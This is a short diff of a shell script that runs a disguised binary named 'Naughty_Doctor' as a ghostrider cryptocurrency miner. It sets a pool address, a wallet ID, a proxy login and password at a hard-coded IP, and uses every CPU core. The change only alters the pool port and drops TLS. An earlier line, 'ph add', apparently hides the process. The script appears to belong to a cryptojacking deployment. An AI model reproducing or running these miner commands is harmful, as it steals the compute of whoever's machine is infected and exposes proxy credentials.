@@ -51,4 +51,4 @@ chmod +x Naughty_Doctor
 
 ph add Naughty_Doctor
 
-./Naughty_Doctor --disable-gpu --algorithm ghostrider --pool na-rtm.pool-server.com:5555 --tls true --wallet RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.NaughtyDoctor --proxy mikrotik999:Elibawnos@3.16.66.235:1080 --cpu-threads $num_of_cores
+./Naughty_Doctor --disable-gpu --algorithm ghostrider --pool na-rtm.pool-server.com:3008 --wallet RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.NaughtyDoctor --proxy mikrotik999:Elibawnos@3.16.66.235:1080 --cpu-threads $num_of_cores
